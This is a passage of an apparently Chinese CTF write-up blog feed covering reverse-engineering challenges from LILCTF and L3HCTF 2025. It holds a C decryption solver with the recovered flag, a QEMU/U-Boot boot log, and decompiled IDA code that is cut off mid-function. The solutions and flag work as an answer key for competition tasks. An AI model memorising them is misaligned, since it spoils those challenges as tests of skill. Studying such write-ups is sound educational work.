function_">nibble_swap_byte</span>(<span class="params">b</span>):</span><br><span class="line">    <span class="keyword">return</span> ((b &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((b &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_bytes</span>(<span class="params">data:<span class="built_in">bytes</span></span>)-&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) != n:</span><br><span class="line">        <span class="keyword">return</span> ValueError(<span class="string">&quot;Data must be exactly 40 bytes long&quot;</span>)</span><br><span class="line">    crt =load_crt()</span><br><span class="line">    crt.srand(seed)</span><br><span class="line"></span><br><span class="line">    out =<span class="built_in">bytearray</span>(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        plain =data[i] | data[i] &lt;&lt; <span class="number">8</span></span><br><span class="line">        r = rand16(crt)</span><br><span class="line">        cipher = plain ^ r</span><br><span class="line">        out[i] = cipher &amp; <span class="number">0xFF</span></span><br><span class="line">        out[i+<span class="number">1</span>] = (cipher &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        out[i] = nibble_swap_byte(out[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        out[i] = (~out[i]) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_bytes</span>(<span class="params">data:<span class="built_in">bytes</span></span>)-&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) != n:</span><br><span class="line">        <span class="keyword">return</span> ValueError(<span class="string">&quot;Data must be exactly 40 bytes long&quot;</span>)</span><br><span class="line">    crt =load_crt()</span><br><span class="line">    crt.srand(seed)</span><br><span class="line"></span><br><span class="line">    tmp=<span class="built_in">bytearray</span>((~b) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> b <span class="keyword">in</span> data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        tmp[i] = nibble_swap_byte(tmp[i])</span><br><span class="line"></span><br><span class="line">    out=<span class="built_in">bytearray</span>(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n, <span class="number">2</span>):</span><br><span class="line">        cipher = tmp[i] | (tmp[i+<span class="number">1</span>] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        r = rand16(crt)</span><br><span class="line">        plain = cipher ^ r</span><br><span class="line">        out[i] = plain &amp; <span class="number">0xFF</span></span><br><span class="line">        out[i+<span class="number">1</span>] = (plain &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bytes</span>(<span class="params">hex_string: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    hex_string=hex_string.strip().replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_string) != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;hex åº”è¯¥ä¸ºå¶æ•°&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_hex</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    parts = []</span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        parts.append(<span class="string">f&quot;<span class="subst">&#123;x:02X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">            parts.append(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span>:</span><br><span class="line">            parts.append(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(parts).strip()</span><br></pre></td></tr></table></figure></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>C çš„ rand() å’Œ Python çš„ random.randint() ä¸æ˜¯ä¸€æ ·çš„éšæœºæ•°ç”Ÿæˆå™¨</p><ul><li>åœ¨ C é‡Œï¼Œrand() é»˜è®¤æ˜¯ çº¿æ€§åŒä½™ç”Ÿæˆå™¨ (LCG)ï¼Œå®ç°ä¾èµ–äº libcï¼ˆglibc / msvc ä¸åŒç»“æœéƒ½å¯èƒ½ä¸åŒï¼‰ã€‚</li><li>åœ¨ Python é‡Œï¼Œrandom ä½¿ç”¨çš„æ˜¯ Mersenne Twister ç®—æ³•ã€‚</li></ul><p>æ¢æˆcå†™ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> ciphertext[<span class="number">40</span>] = &#123;<span class="number">0x5c</span>,<span class="number">0xaf</span>,<span class="number">0xb0</span>,<span class="number">0x1c</span>,<span class="number">0xfc</span>,<span class="number">0xef</span>,<span class="number">0xc7</span>,<span class="number">0x8f</span>,<span class="number">0x03</span>,<span class="number">0xdf</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x11</span>,<span class="number">0xbc</span>,<span class="number">0x47</span>,<span class="number">0x2d</span>,<span class="number">0x0c</span>,<span class="number">0x48</span>,<span class="number">0xff</span>,<span class="number">0x8f</span>,<span class="number">0x7f</span>,<span class="number">0x0d</span>,<span class="number">0xd0</span>,<span class="number">0xfa</span>,<span class="number">0xf8</span>,<span class="number">0x3f</span>,<span class="number">0x83</span>,<span class="number">0xfd</span>,<span class="number">0xa6</span>,<span class="number">0xa8</span>,<span class="number">0x06</span>,<span class="number">0x1e</span>,<span class="number">0xce</span>,<span class="number">0x7b</span>,<span class="number">0x25</span>,<span class="number">0xbe</span>,<span class="number">0x53</span>,<span class="number">0xdc</span>,<span class="number">0xdd</span>,<span class="number">0x1b</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> temp[<span class="number">40</span>];</span><br><span class="line">    <span class="type">uint8_t</span> plaintext[<span class="number">40</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> seed = <span class="number">0x48691412</span>;</span><br><span class="line">    srand(seed);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; ++i) &#123;</span><br><span class="line">        temp[i] = ~ciphertext[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; ++i) &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v = temp[i];</span><br><span class="line">        temp[i] = ((v &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (v &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">uint16_t</span> cipher = temp[i] | (temp[i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        <span class="type">uint16_t</span> r = rand() &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        <span class="type">uint16_t</span> plain = cipher ^ r;</span><br><span class="line">        plaintext[i] = plain &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plaintext[i + <span class="number">1</span>] = (plain &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, plaintext[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// LILCTF&#123;WhAt_iS_DA7AfloW_cAn_lT_Be_3a73n&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="Oh-My-Uboot"><a href="#Oh-My-Uboot" class="headerlink" title="Oh_My_Uboot"></a>Oh_My_Uboot</h1><p>å¯åŠ¨ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\qemu-system-arm.exe \</span><br><span class="line">  -machine vexpress-a9 \</span><br><span class="line">  -cpu cortex-a9 \</span><br><span class="line">  -kernel <span class="string">&quot;D:\LeStoreDownload\webpage\CTF\2025 0815-0817 LilCTF\Oh_My_Uboot\152416_re-u-boot&quot;</span> \</span><br><span class="line">  -nographic \</span><br><span class="line">  -semihosting-config <span class="built_in">enable</span>=on,target=native</span><br></pre></td></tr></table></figure><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">U-Boot 2025.04 (Jul 01 2025 - 13:56:28 +0800)</span><br><span class="line"></span><br><span class="line">DRAM:  128 MiB</span><br><span class="line">WARNING: Caches not enabled</span><br><span class="line">Core:  23 devices, 11 uclasses, devicetree: embed</span><br><span class="line">Flash: 128 MiB</span><br><span class="line">MMC:   mmci@5000: 0</span><br><span class="line">Loading Environment from Flash... *** Warning - bad CRC, using default environment</span><br><span class="line"></span><br><span class="line">In:    uart@9000</span><br><span class="line">Out:   uart@9000</span><br><span class="line">Err:   uart@9000</span><br><span class="line">Net:   eth0: ethernet@3,02000000</span><br><span class="line">Autoboot <span class="keyword">in</span> 2 seconds</span><br><span class="line">Hash sha256 not supported!</span><br><span class="line">MMC Device 1 not found</span><br><span class="line">no mmc device at slot 1</span><br><span class="line">Card did not respond to voltage <span class="keyword">select</span>! : -110</span><br><span class="line">smc911x: detected LAN9118 controller</span><br><span class="line">smc911x: phy initialized</span><br><span class="line">smc911x: MAC 52:54:00:12:34:56</span><br><span class="line">BOOTP broadcast 1</span><br><span class="line">DHCP client bound to address 10.0.2.15 (2 ms)</span><br><span class="line">*** Warning: no boot file name; using <span class="string">&#x27;0A00020F.img&#x27;</span></span><br><span class="line">Using ethernet@3,02000000 device</span><br><span class="line">TFTP from server 10.0.2.2; our IP address is 10.0.2.15</span><br><span class="line">Filename <span class="string">&#x27;0A00020F.img&#x27;</span>.</span><br><span class="line">Load address: 0x60100000</span><br><span class="line">Loading: *</span><br><span class="line">TFTP error: <span class="string">&#x27;Access violation&#x27;</span> (2)</span><br><span class="line">Not retrying...</span><br><span class="line">smc911x: MAC 52:54:00:12:34:56</span><br><span class="line">missing environment variable: pxefile_addr_r</span><br><span class="line">smc911x: detected LAN9118 controller</span><br><span class="line">smc911x: phy initialized</span><br><span class="line">smc911x: MAC 52:54:00:12:34:56</span><br><span class="line">BOOTP broadcast 1</span><br><span class="line">DHCP client bound to address 10.0.2.15 (1 ms)</span><br><span class="line">Using ethernet@3,02000000 device</span><br><span class="line">TFTP from server 10.0.2.2; our IP address is 10.0.2.15</span><br><span class="line">Filename <span class="string">&#x27;boot.scr.uimg&#x27;</span>.</span><br><span class="line">Load address: 0x60100000</span><br><span class="line">Loading: *</span><br><span class="line">TFTP error: <span class="string">&#x27;Access violation&#x27;</span> (2)</span><br><span class="line">Not retrying...</span><br><span class="line">smc911x: MAC 52:54:00:12:34:56</span><br><span class="line">smc911x: detected LAN9118 controller</span><br><span class="line">smc911x: phy initialized</span><br><span class="line">smc911x: MAC 52:54:00:12:34:56</span><br><span class="line">BOOTP broadcast 1</span><br><span class="line">DHCP client bound to address 10.0.2.15 (1 ms)</span><br><span class="line">Using ethernet@3,02000000 device</span><br><span class="line">TFTP from server 10.0.2.2; our IP address is 10.0.2.15</span><br><span class="line">Filename <span class="string">&#x27;boot.scr.uimg&#x27;</span>.</span><br><span class="line">Load address: 0x60100000</span><br><span class="line">Loading: *</span><br><span class="line">TFTP error: <span class="string">&#x27;Access violation&#x27;</span> (2)</span><br><span class="line">Not retrying...</span><br><span class="line">smc911x: MAC 52:54:00:12:34:56</span><br><span class="line"><span class="built_in">cp</span> - memory copy</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line"><span class="built_in">cp</span> [.b, .w, .l] <span class="built_in">source</span> target count</span><br><span class="line">Wrong Image Type <span class="keyword">for</span> bootm <span class="built_in">command</span></span><br><span class="line">ERROR -91: can<span class="string">&#x27;t get kernel image!</span></span><br><span class="line"><span class="string">### Please input uboot password: ###</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L3HCTF 2025 WriteUp (Reverseæ–¹å‘) (æ›´æ–°ä¸­)</title>
      <link href="/2025/08/05/L3HCTF2025/"/>
      <url>/2025/08/05/L3HCTF2025/</url>
      
        <content type="html"><![CDATA[<p><em>å› ä¸ºå¥½ä¹…æ²¡æ›´æ–°åšå®¢è¢«SWæ‹·æ‰“äº†ï¼Œæ€æ¥æƒ³å»å†³å®šè¿˜æ˜¯æŠŠWritrupæ”¾åœ¨blogä¸Šï¼Œä¸€ä¸ªæ˜¯å‚¬è‡ªå·±å¤ç°å–µï¼Œä¸€ä¸ªæ˜¯èƒ½æ•´ç†ä¸€ä¸‹æ€è·¯ç»ƒç»ƒä»£ç èƒ½åŠ›ã€‚</em><br><em>ä¸‹å‘¨ciscnçš„PPTè¿˜æ²¡åšï¼Œèƒ½ä¸èƒ½å¤©é™ä¸€ä¸ªPPTé«˜çº§å·¥ç¨‹å¤§å¸ˆæ¥æ•‘æ•‘æˆ‘TT</em> <del>ä¸ºä»€ä¹ˆæš‘å‡ä¼šæ¯”ä¸Šå­¦å¿™å•Šï¼Œæš‘å‡å›æ¥è¿è½´è½¬TT</del></p><p>å½“æ—¶æ‰“l3hçš„æ—¶å€™åœ¨åšæ‰‹æœ¯ï¼Œä¸¤å¤©éƒ½åªæœ‰åŠå¤œæ‘¸äº†ä¸€ä¸‹ç”µè„‘ï¼Œåªæ‰“äº†ä¸¤é“TT ä½†æ˜¯æˆ‘åº”è¯¥ä¼šå…¨å¤ç°çš„ï¼</p><h1 id="TemporalParadox"><a href="#TemporalParadox" class="headerlink" title="TemporalParadox"></a>TemporalParadox</h1><p>One day I made a request, but I forgot what it was. Can you help me find it?</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Decompilation failure:</span><br><span class="line"><span class="number">140001</span>D20: positive sp value has been found</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000140001</span>D20     loc_140001D20:      ; CODE XREF: sub_140001D05+<span class="number">16</span>â†‘j</span><br><span class="line">.text:<span class="number">0000000140001</span>D20 <span class="number">168</span>                 call    locret_140001D1E</span><br><span class="line">.text:<span class="number">0000000140001</span>D1E     locret_140001D1E:   ; CODE XREF: sub_140001D05:loc_140001D20â†“p</span><br><span class="line">.text:<span class="number">0000000140001</span>D1E <span class="number">000</span>                 retn</span><br></pre></td></tr></table></figure><p>nopæ‰</p><h2 id="sub-140001D05"><a href="#sub-140001D05" class="headerlink" title="sub_140001D05"></a>sub_140001D05</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140001D05</span><span class="params">(<span class="type">time_t</span> *Time, __int64 a2)</span></span><br><span class="line">  <span class="title function_">sub_140002180</span><span class="params">(Time, a2)</span>;</span><br><span class="line">  sub_14000A510((_DWORD)Time, a2, v2, (<span class="type">unsigned</span> <span class="type">int</span>)v50, v3, v4);</span><br><span class="line">  n1751990400 = time(Time);                     <span class="comment">// è·å–å½“å‰çš„ç³»ç»Ÿæ—¶é—´</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( n1751990400 &gt; <span class="number">1751990400</span> &amp;&amp; n1751990400 &lt;= <span class="number">1752052051</span> )</span><br><span class="line">  <span class="comment">//æ—¶é—´æˆ³èŒƒå›´çº¦æŸ</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_140001963((_DWORD)Time, a2, v5, (<span class="type">unsigned</span> <span class="type">int</span>)v46, v6, v7);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    v54 = &amp;v51;</span><br><span class="line">    v9 = <span class="built_in">std</span>::<span class="built_in">string</span>::c_str(Time, a2, v8, v46);</span><br><span class="line">    v12 = sub_14000A040((_DWORD)Time, a2, v9, (<span class="type">unsigned</span> <span class="type">int</span>)v50, v10, v11, v38);</span><br><span class="line">    sub_14000A820((_DWORD)Time, a2, v12, (<span class="type">unsigned</span> <span class="type">int</span>)v47, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v51, v13, v39, v44);</span><br><span class="line">    sub_14000A6E0((_DWORD)Time, a2, v14, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v51, v15, v16, v40);</span><br><span class="line">    p__ZSt4cout = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;query: &quot;</span>, &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>);</span><br><span class="line">    v18 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="type">char</span>&gt;(Time, a2, v46, p__ZSt4cout);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;, v18);</span><br><span class="line">    v19 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="type">char</span>&gt;(Time, a2, v47, &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;, v19);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(Time, a2, v20, v47);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(Time, a2, v21, v46);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(Time, a2, v5, v49);</span><br><span class="line">  v22 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;Please input the right query string I used:&quot;</span>, &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;, v22);</span><br><span class="line">  <span class="built_in">std</span>::operator&gt;&gt;&lt;<span class="type">char</span>&gt;(Time, a2, v49, &amp;<span class="built_in">std</span>::<span class="built_in">cin</span>);</span><br><span class="line">  v53 = &amp;v52;</span><br><span class="line">  v24 = <span class="built_in">std</span>::<span class="built_in">string</span>::c_str(Time, a2, v23, v49);</span><br><span class="line">  v27 = sub_14000A040((_DWORD)Time, a2, v24, (<span class="type">unsigned</span> <span class="type">int</span>)v50, v25, v26, v38);</span><br><span class="line">  sub_14000A820((_DWORD)Time, a2, v27, (<span class="type">unsigned</span> <span class="type">int</span>)v48, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v52, v28, v41, v44);</span><br><span class="line">  sub_14000A6E0((_DWORD)Time, a2, v29, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v52, v30, v31, v42);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_14000A8E0(</span><br><span class="line">                          (_DWORD)Time,</span><br><span class="line">                          a2,</span><br><span class="line">                          (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;8a2fc1e9e2830c37f8a7f51572a640aa&quot;</span>,</span><br><span class="line">                          (<span class="type">unsigned</span> <span class="type">int</span>)v48,</span><br><span class="line">                          v32,</span><br><span class="line">                          v33,</span><br><span class="line">                          v43,</span><br><span class="line">                          v45) )</span><br><span class="line">    v34 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;Congratulations!&quot;</span>, &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v34 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(Time, a2, <span class="string">&quot;Wrong!&quot;</span>, &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(Time, a2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;, v34);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(Time, a2, v35, v48);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(Time, a2, v36, v49);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sub-140001963"><a href="#sub-140001963" class="headerlink" title="sub_140001963"></a>sub_140001963</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140001963</span><span class="params">(</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">  sub_140001518((_DWORD)Time, a2, a3, (<span class="type">unsigned</span> <span class="type">int</span>)v51, a5, a6);</span></span><br><span class="line"><span class="params">  v53 = time(Time);</span></span><br><span class="line"><span class="params">  sub_1400014B5((_DWORD)Time, a2, v10, v53, v11, v12);<span class="comment">// </span></span></span><br><span class="line"><span class="params">                                                <span class="comment">// å°†å‚æ•° a4ï¼ˆä¸€ä¸ªæ•´æ•°ï¼‰ä¿å­˜åˆ°å…¨å±€å˜é‡ dword_7FF75004B040 ä¸­ï¼Œè‹¥ä¸º 0 åˆ™å¼ºåˆ¶è®¾ä¸º 1ã€‚</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">  v58 = <span class="number">0</span>;</span></span><br><span class="line"><span class="params">  v57 = <span class="number">0</span>;</span></span><br><span class="line"><span class="params">  v56 = <span class="number">0</span>;</span></span><br><span class="line"><span class="params">  v55 = <span class="number">0</span>;</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">int</span>)random(); ++i )</span></span><br><span class="line"><span class="params">  &#123;</span></span><br><span class="line"><span class="params">    v58 = random();</span></span><br><span class="line"><span class="params">    v57 = random();</span></span><br><span class="line"><span class="params">    v56 = random();</span></span><br><span class="line"><span class="params">    v55 = random();</span></span><br><span class="line"><span class="params">  &#125;</span></span><br><span class="line"><span class="params">  v52 = 